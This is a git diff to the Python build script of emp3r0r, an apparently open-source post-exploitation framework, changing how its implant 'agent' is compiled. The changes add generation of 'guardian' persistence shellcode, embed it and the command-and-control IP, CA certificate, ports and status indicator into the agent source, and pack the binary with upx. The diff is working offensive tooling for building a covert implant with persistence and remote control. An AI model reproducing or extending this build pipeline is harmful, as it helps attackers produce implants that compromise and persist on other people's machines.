@@ -13,6 +13,7 @@ import os
 import random
 import readline
 import shutil
+import subprocess
 import sys
 import traceback
 import uuid
@@ -43,6 +44,7 @@ class GoBuild:
         self.CC_OTHER_NAMES = cc_other_names
         self.INDICATOR = cc_indicator
         self.UUID = str(uuid.uuid1())
+        self.VERSION = get_version()
 
         # agent root directory
 
@@ -81,18 +83,21 @@ class GoBuild:
             return
 
         log_warn("GO BUILD starts...")
+        build_target = f"../../build/{self.target}"
+        if self.target == "agent":
+            build_target = f"../../build/{self.target}-{self.UUID}"
         # cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH}''' + \
         # f''' go build -ldflags='-s -w -extldflags "-static"' -o ../../build/{self.target}'''
         cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0''' + \
-            f''' go build -ldflags='-s -w' -o ../../build/{self.target}-{self.UUID}'''
+            f''' go build -ldflags='-s -w' -o {build_target}'''
         os.system(cmd)
         log_warn("GO BUILD ends...")
 
         os.chdir("../../")
         self.unset_tags()
 
-        if os.path.exists(f"./build/{self.target}-{self.UUID}"):
-            os.system(f"upx -9 ./build/{self.target}-{self.UUID}")
+        if os.path.exists(f"./build/{build_target.split('/')[-1]}"):
+            os.system(f"upx -9 ./build/{build_target.split('/')[-1]}")
         else:
             log_error("go build failed")
             sys.exit(1)
@@ -122,16 +127,23 @@ class GoBuild:
     def unset_tags(self):
         '''
         restore tags in the source
-
-        - CA: emp3r0r CA, ./internal/tun/tls.go
-        - CC indicator: check if CC is online, ./internal/agent/def.go
-        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
-        - CC IP: IP of CC server, ./internal/agent/def.go
         '''
 
+        # version
+        sed("./internal/agent/def.go",
+            f"Version = \"{self.VERSION}\"", "Version = \"[emp3r0r_version_string]\"")
+        # agent root path
         sed("./internal/agent/def.go",
             self.AgentRoot, "[agent_root]")
+        # CA
         sed("./internal/tun/tls.go", self.CA, "[emp3r0r_ca]")
+        if self.target == "agent":
+            # guardian_shellcode
+            sed("./internal/agent/def.go", f"GuardianShellcode = `{CACHED_CONF['guardian_shellcode']}`",
+                "GuardianShellcode = `[persistence_shellcode]`")
+            sed("./internal/agent/def.go", f"GuardianAgentPath = \"{CACHED_CONF['guardian_agent_path']}\"",
+                "GuardianAgentPath = \"[persistence_agent_path]\"")
+        # cc indicator
         sed("./internal/agent/def.go", self.INDICATOR, "[cc_indicator]")
         # in case we use the same IP for indicator and CC
         sed("./internal/agent/def.go", self.CCIP, "[cc_ipaddr]")
@@ -147,24 +159,34 @@ class GoBuild:
     def set_tags(self):
         '''
         modify some tags in the source
-
-        - CA: emp3r0r CA, ./internal/tun/tls.go
-        - CC indicator: check if CC is online, ./internal/agent/def.go
-        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
-        - CC IP: IP of CC server, ./internal/agent/def.go
         '''
 
+        # version
+        sed("./internal/agent/def.go",
+            "Version = \"[emp3r0r_version_string]\"", f"Version = \"{self.VERSION}\"")
+        if self.target == "agent":
+            # guardian shellcode
+            sed("./internal/agent/def.go",
+                "[persistence_shellcode]", CACHED_CONF['guardian_shellcode'])
+            sed("./internal/agent/def.go",
+                "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])
+        # CA
         sed("./internal/tun/tls.go", "[emp3r0r_ca]", self.CA)
+        # CC IP
         sed("./internal/agent/def.go", "[cc_ipaddr]", self.CCIP)
+        # agent root path
+        sed("./internal/agent/def.go", "[agent_root]", self.AgentRoot)
+        # indicator
+        sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
+        # agent UUID
+        sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)
+        # ports
         sed("./internal/agent/def.go",
             "[cc_port]", CACHED_CONF['cc_port'])
         sed("./internal/agent/def.go",
             "[proxy_port]", CACHED_CONF['proxy_port'])
         sed("./internal/agent/def.go",
             "[broadcast_port]", CACHED_CONF['broadcast_port'])
-        sed("./internal/agent/def.go", "[agent_root]", self.AgentRoot)
-        sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
-        sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)
 
 
 def clean():
@@ -226,6 +248,7 @@ def rand_str(length):
     uuidstr = str(uuid.uuid4()).replace('-', '')
 
     # we don't want the string to be long
+
     if length >= len(uuidstr):
         return uuidstr
 
@@ -284,6 +307,21 @@ def main(target):
     if not use_cached:
         indicator = input("CC status indicator: ").strip()
         CACHED_CONF['cc_indicator'] = indicator
+
+    # guardian shellcode
+
+    use_cached = False
+
+    if "guardian_shellcode" in CACHED_CONF and "guardian_agent_path" in CACHED_CONF:
+        guardian_shellcode = CACHED_CONF['guardian_shellcode']
+        guardian_agent_path = CACHED_CONF['guardian_agent_path']
+        use_cached = yes_no(
+            f"Use cached {len(guardian_shellcode)} bytes of guardian shellcode ({guardian_agent_path})?")
+
+    if not use_cached:
+        path = input("Agent path for guardian shellcode: ").strip()
+        CACHED_CONF['guardian_shellcode'] = gen_guardian_shellcode(path)
+        CACHED_CONF['guardian_agent_path'] = path
 
     gobuild = GoBuild(target="agent", cc_indicator=indicator, cc_ip=ccip)
     gobuild.build()
@@ -347,6 +385,53 @@ def randomize_ports():
 
     if 'broadcast_port' not in CACHED_CONF:
         CACHED_CONF['broadcast_port'] = rand_port()
+
+
+def gen_guardian_shellcode(path):
+    '''
+    ../shellcode/gen.py
+    '''
+    try:
+        pwd = os.getcwd()
+        os.chdir("../shellcode")
+        out = subprocess.check_output(["python3", "gen.py", path])
+        os.chdir(pwd)
+
+        shellcode = out.decode('utf-8')
+
+        if "Failed" in shellcode:
+            log_error("Failed to generate shellcode: "+out)
+
+            return "N/A"
+    except BaseException:
+        log_error(traceback.format_exc())
+
+        return "N/A"
+
+    return shellcode
+
+
+def get_version():
+    '''
+    print current version
+    '''
+    try:
+        check = "git describe --tags"
+        out = subprocess.check_output(
+            ["/bin/sh", "-c", check],
+            stderr=subprocess.STDOUT, timeout=3)
+    except KeyboardInterrupt:
+        return "Unknown"
+    except BaseException:
+        check = "git describe --always"
+        try:
+            out = subprocess.check_output(
+                ["/bin/sh", "-c", check],
+                stderr=subprocess.STDOUT, timeout=3)
+        except BaseException:
+            return "Unknown"
+
+    return out.decode("utf-8").strip()
 
 
 # command line args
